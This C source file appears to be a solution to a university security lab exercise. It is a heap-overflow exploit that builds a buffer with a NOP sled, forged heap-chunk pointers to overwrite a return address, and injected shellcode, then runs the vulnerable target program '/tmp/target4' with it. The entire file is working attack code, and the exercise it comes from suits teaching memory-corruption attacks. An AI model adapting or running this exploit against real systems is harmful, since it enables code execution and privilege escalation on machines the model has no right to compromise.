#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];
  
  char buf[1024]; 
  
  memset(buf, 0x90, sizeof(buf));
  strncpy(buf+2, "\xeb\x04", 2); // jmp: left pointer of left chunk
  strncpy(buf+4, "\x7d\xfa\xff\xbf", 4); // EIP + 1: right pointer of left chunk
  strncpy(buf+208-strlen(shellcode), shellcode, strlen(shellcode)); // shellcode
  strncpy(buf+208, "\x78\x98\x05\x08", 4); // left pointer of right chunk
  strncpy(buf+212, "\x7c\xfa\xff\xbf", 4); // EIP: right pointer of right chunk
  strncpy(buf+1023, "\x00", 1); // null terminate

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
